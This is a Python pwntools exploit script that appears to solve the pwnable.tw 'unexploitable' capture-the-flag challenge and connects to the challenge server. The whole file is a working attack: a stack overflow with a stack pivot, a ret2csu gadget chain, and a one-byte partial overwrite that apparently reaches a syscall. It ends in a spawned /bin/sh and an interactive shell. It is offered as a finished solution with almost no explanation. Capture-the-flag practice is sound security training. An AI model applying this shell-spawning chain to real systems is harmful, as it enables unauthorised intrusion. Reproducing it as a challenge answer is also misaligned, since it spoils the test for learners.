#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("unexploitable_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        #r = process("./unexploitable", env={"LD_PRELOAD":"./libc_64.so.6"})
        r = process([exe.path])
        if args.HEHE:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10403)

    return r


def main():
    r = conn()
    pop_rbp = p64(0x0000000000400512)
    leave_ret = p64(0x0000000000400576) 
    pl = 24*b'A'+pop_rbp+p64(0x601020+0x10)+p64(exe.sym['main']+23)
    pl += b'\0' * (0x100 - len(pl))
    r.send(pl)
    pl2 = p64(0x601030+0x10)+p64(exe.sym['main']+23)+p64(0x601010+0x10)+p64(exe.sym['main']+23)
    pl2 += b'\0' * (0x100 - len(pl2))
    r.send(pl2)
    r.send(b'\xfb')
    pl3 = p64(0)+p64(0)+p64(0x601090+0x10)+p64(exe.sym['main']+23)+64*b'\0'
    pl3 += b'/bin/sh\0'+p64(0)
    pl3 += p64(0x601090+0x10)+p64(0x4005e6)#p64(exe.sym['main']+23)
    pl3 += p64(0x601080+0x10) # [rsp]
    pl3 += p64(0)             # [rsp+0x8]  - rbx
    pl3 += p64(0)             # [rsp+0x10] - rbp
    pl3 += p64(0x601010)      # [rsp+0x18] - r12
    pl3 += p64(0x601090)      # [rsp+0x20] - rdi
    pl3 += p64(0)             # [rsp+0x28] - rsi
    pl3 += p64(0)             # [rsp+0x30] - rdx
    pl3 += p64(0x4005d0)
    print(len(pl3))
    sleep(5)
    #input("Enter")
    r.send(pl3)
    sleep(5)
    #input("Enter")
    pl4 = b'/bin/sh\0'+p64(0)
    pl4 += p64(0x601090+0x10)+p64(0x4005e6)
    pl4 += p64(0x601080+0x10)+p64(0)
    pl4 += p64(0)+b'\x10\x10\x60'
    r.send(pl4)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
